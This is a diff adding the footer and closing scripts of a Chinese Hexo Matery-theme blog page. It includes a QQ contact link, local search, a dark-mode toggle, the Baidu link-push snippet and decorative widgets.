+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1740449925" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1740449925" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script type="text/javascript" src="\js\FunnyTitle.js"></script>
+    
+    <script>
+        // 判断是否为暗色模式 (通常 Hexo 主题会将模式存储在 localStorage 中)
+        var isDark = localStorage.getItem('isDark') === 'true';
+        
+        // 如果是暗色模式，使用浅灰色 (220,220,220)，否则使用原本的深灰色 (26,26,26)
+        var color = isDark ? "255,255,255" : "26,26,26";
+        
+        var script = document.createElement("script");
+        script.type = "text/javascript";
+        script.src = "//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js";
+        
+        // 设置配置参数
+        script.setAttribute("color", color);
+        script.setAttribute("opacity", '0.6');
+        script.setAttribute("zIndex", "-2");
+        script.setAttribute("count", "200");
+        
+        document.body.appendChild(script);
+    </script>
+    
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+    <script>
+        function switchNightMode() {
+          $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+            setTimeout(function () {
+              $('body').hasClass('DarkMode') ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'),$('#nightMode').removeClass('fa-moon-o').addClass('fa-lightbulb-o')): ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#nightMode').removeClass('fa-lightbulb-o').addClass('fa-moon-o')),
+                setTimeout(function () {
+                  $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                    $(this).remove()
+                  })
+                }, 2e3)
+            })
+        }
+        function switchNightModeTop() {
+          $('body').hasClass('DarkMode') ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'),$('#nightMode').removeClass('fa-moon-o').addClass('fa-lightbulb-o')) : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#nightMode').removeClass('fa-lightbulb-o').addClass('fa-moon-o'))
+        }
+      </script>
+      
+      <script>
+      if (localStorage.getItem('isDark') === '1') {
+          ('body').addClass('DarkMode');
+          }
+          else if (new Date().getHours() >= 22 || new Date().getHours() < 7) {
+          ('body').addClass('DarkMode');
+          } 
+          else if (matchMedia('(prefers-color-scheme: dark)').matches) {
+          ('body').addClass('DarkMode');
+          }
+      </script>
+      <a onclick="switchNightMode()" id="sma" title="切换主题">
+          <i class="fa fa-lightbulb-o" id="nightMode"  aria-hidden="false"></i>
+      </a>
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
